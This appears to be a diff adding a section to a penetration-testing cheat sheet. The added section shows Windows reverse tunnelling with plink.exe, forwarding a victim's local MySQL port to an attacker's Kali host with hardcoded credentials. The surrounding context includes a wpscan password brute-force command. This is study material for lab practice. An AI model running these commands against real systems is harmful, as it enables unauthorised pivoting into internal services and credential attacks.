@@ -115,6 +115,19 @@ proxychains4 firefox http://127.0.0.1/
 ````
 proxychains wpscan --url http://127.0.0.1:80/ --usernames usernames.txt --passwords /usr/share/wordlists/rockyou.txt
 ````
+#### Windows Tunneling/Port Fowarding w/plink.exe
+Check open network connections to port foward
+````
+netstat -anpb TCP
+````
+Option 1
+````
+plink.exe -ssh -l kali -pw ilak -R <your kali IP>:1234:127.0.0.1:3306 <your kali IP>
+````
+Option 2
+````
+cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R <your kali IP>:1234:127.0.0.1:3306 <your kali IP>
+````
 ## Compiling Exploit Codes <img src="https://cdn-icons-png.flaticon.com/128/868/868786.png" width="40" height="40" />
 
 ## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
